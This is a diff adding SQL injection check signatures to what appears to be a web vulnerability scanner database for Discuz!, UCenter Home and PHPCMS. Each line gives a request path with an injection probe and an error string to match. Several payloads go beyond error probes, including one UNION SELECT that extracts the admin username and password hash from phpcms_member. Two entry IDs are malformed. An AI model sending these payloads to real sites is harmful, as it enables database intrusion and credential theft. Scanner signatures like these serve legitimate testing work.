@@ -1,0 +1,15 @@
+50195#d9Fa0j#HIGH#d9Fa0j#Discuz X1.5 sql注入漏洞#d9Fa0j#/bbs/api/trade/notify_credit.php?attach=tenpay&retcode=0&mch_vno=%2527%#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz! X1-1.5 notify_credit.php注入漏洞#d9Fa0j#
+50196#d9Fa0j#HIGH#d9Fa0j#UCenter Home 2.0 sql注入漏洞#d9Fa0j#/bbs/shop.php?ac=view&shopid=25327%#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#UCenter Home 2.0 SQL注入#d9Fa0j#
+50197#d9Fa0j#HIGH#d9Fa0j#Discuz! 7.2 插件注入漏洞#d9Fa0j#/bbs/userapp.php?script=notice&view=all&option=deluserapp&action=invite&hash=%27#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#UDiscuz! 7.2 插件/manyou/sources/notice.php sql注入漏洞#d9Fa0j#
+50198#d9Fa0j#HIGH#d9Fa0j#Discuz v1.0 SQL注入#d9Fa0j#/bbs/misc.php?sub=profile&name=0%27#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz v1.0 SQL注入#d9Fa0j#
+50199#d9Fa0j#HIGH#d9Fa0j#Discuz! SQL注入#d9Fa0j#/bbs/forummission.php?index=show&id=24%27#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz! SQL注入#d9Fa0j#
+50200#d9Fa0j#HIGH#d9Fa0j#Discuz!<=2.0 注入漏洞#d9Fa0j#/bbs/plugin.php?identifier=family&module=family&action=view&fmid=1%27#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz!<=2.0 注入漏洞#d9Fa0j#
+5020d9Fa0j#HIGH#d9Fa0j#Discuz!插件 注入漏洞#d9Fa0j#/bbs/2fly_gift.php?pages=content&gameid=16%27#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz!账号发放插件"2fly_gift.php" SQL注入漏洞#d9Fa0j#
+50202#d9Fa0j#HIGH#d9Fa0j#Discuz! X2.0 SQL注入漏洞#d9Fa0j#/bbs/forum.php?mod=attachment&findpost=ss&aid=Jw==#d9Fa0j#GET#d9Fa0j#SQL syntax#d9Fa0j#Discuz! X2.0 SQL注入漏洞#d9Fa0j#
+50203#d9Fa0j#HIGH#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#/phpcms/yp/product.php?catid=1&areaname=555%27%20and%20extractvalue%281,concat%280x09,%28version%28%29%29%29%29%20and%20%271%27=%27d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#
+50204#d9Fa0j#HIGH#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#/yp/product.php?catid=1&areaname=555%27%20and%20extractvalue%281,concat%280x09,%28version%28%29%29%29%29%20and%20%271%27=%27d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#
+50205#d9Fa0j#HIGH#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#/yp/product.php?prowhere=1%27#d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#
+50206#d9Fa0j#HIGH#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#/phpcms/yp/product.php?prowhere=1%27#d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#phpcms 2008 SQL注入#d9Fa0j#
+50209#d9Fa0j#HIGH#d9Fa0j#PHPCMS V9 问吧模块注入漏洞 #d9Fa0j#/index.php?m=ask&c=center&a=edit&id=2%20union%20select%20*%20from%20fuck#d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#PHPCMS V9 问吧模块注入漏洞#d9Fa0j#
+50210#d9Fa0j#HIGH#d9Fa0j#phpcms2008 & phpcms2007SQL注入漏洞 #d9Fa0j#/ask/search_ajax.php?q=s%E6%27#d9Fa0j#GET#d9Fa0j#MySQL Query#d9Fa0j#phpcms2008 & phpcms2007 GBK版ask/search_ajax.php SQL注入漏洞#d9Fa0j#
+5021d9Fa0j#HIGH#d9Fa0j#phpcms v2.4 SQL 注入漏洞 #d9Fa0j#/vote.php?action=result&voteid=999999.9+UNION+ALL+SELECT+(Select%20concat(0x7e,0x27,userid,0x27,username,0x27,password,0x7e,0x27)%20FROM%20phpcms_member%20where%20adminid=1%20limit%200,1)+,12,12,12,12,12,12,12,12,12,12,12,12--#d9Fa0j#GET#d9Fa0j#voteid=~%27#d9Fa0j#phpcms v2.4 SQL 注入漏洞#d9Fa0j#
